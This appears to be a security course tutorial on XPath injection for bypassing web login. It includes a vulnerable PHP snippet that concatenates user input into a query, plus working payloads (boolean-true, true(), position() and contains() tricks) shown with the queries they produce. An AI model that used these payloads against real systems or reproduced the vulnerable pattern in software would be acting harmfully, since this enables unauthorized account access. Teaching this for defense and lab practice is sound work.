# XPath - Authentication Bypass

Now that we have a basic idea of XPath query syntax, let's look at how XPath injection can be weaponized to bypass web authentication.

## Foundation
Example XML user store:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```

Typical query used for auth:

```xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

Vulnerable PHP (unsanitized concatenation):

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

## Basic Bypass (boolean true)
Inject values so the predicate always evaluates to true:

```xpath
' or '1'='1
```

Resulting query example:

```xpath
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

This returns all `user` nodes; apps often take the first match (logs in as the first user).

To target a specific username (e.g., admin) without a valid password:

```xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```

## Hashed Password Scenario
If passwords are hashed server-side before interpolation:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```

A naive `' or '1'='1` will fail because the password literal becomes a fixed hash.

### Technique A: Universal true via double OR

```xpath
' or true() or '
```

Result:

```xpath
/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

### Technique B: Select by position

```xpath
' or position()=2 or '
```

Result:

```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Increment the index to iterate users.

### Technique C: contains() to match partial usernames

```xpath
' or contains(., 'admin') or '
```

Result:

```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Matches users whose node string-value contains "admin" (e.g., username descendants).

## Notes & Tips
- Try both username and password fields; either can influence the predicate.
- Use application behavior (messages, returned content) to confirm success.
- Do not store or publish sensitive flags. Omit secret values in write-ups.
